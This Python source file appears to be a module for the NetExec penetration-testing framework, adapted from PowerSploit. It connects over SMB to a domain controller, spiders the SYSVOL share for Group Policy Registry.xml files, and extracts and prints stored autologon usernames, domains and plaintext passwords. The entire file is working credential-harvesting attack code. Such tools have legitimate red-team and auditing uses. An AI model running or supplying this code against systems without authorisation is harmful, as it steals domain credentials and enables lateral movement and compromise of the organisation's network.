import xml.etree.ElementTree as ET
from io import BytesIO


class NXCModule:
    """
    Reference: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1
    Module by @byt3bl33d3r
    """

    name = "gpp_autologin"
    description = "Searches the domain controller for registry.xml to find autologon information and returns the username and password."
    supported_protocols = ["smb"]

    def options(self, context, module_options):
        """ """

    def on_login(self, context, connection):
        shares = connection.shares()
        for share in shares:
            if share["name"] == "SYSVOL" and "READ" in share["access"]:
                context.log.success("Found SYSVOL share")
                context.log.display("Searching for Registry.xml")

                paths = connection.spider("SYSVOL", pattern=["Registry.xml"])

                for path in paths:
                    context.log.display(f"Found {path}")

                    buf = BytesIO()
                    connection.conn.getFile("SYSVOL", path, buf.write)
                    xml = ET.fromstring(buf.getvalue())

                    if xml.findall('.//Properties[@name="DefaultPassword"]'):
                        usernames = []
                        passwords = []
                        domains = []

                        xml_section = xml.findall(".//Properties")

                        for section in xml_section:
                            attrs = section.attrib

                            if attrs["name"] == "DefaultPassword":
                                passwords.append(attrs["value"])

                            if attrs["name"] == "DefaultUserName":
                                usernames.append(attrs["value"])

                            if attrs["name"] == "DefaultDomainName":
                                domains.append(attrs["value"])

                        if usernames or passwords:
                            context.log.success(f"Found credentials in {path}")
                            context.log.highlight(f"Usernames: {usernames}")
                            context.log.highlight(f"Domains: {domains}")
                            context.log.highlight(f"Passwords: {passwords}")
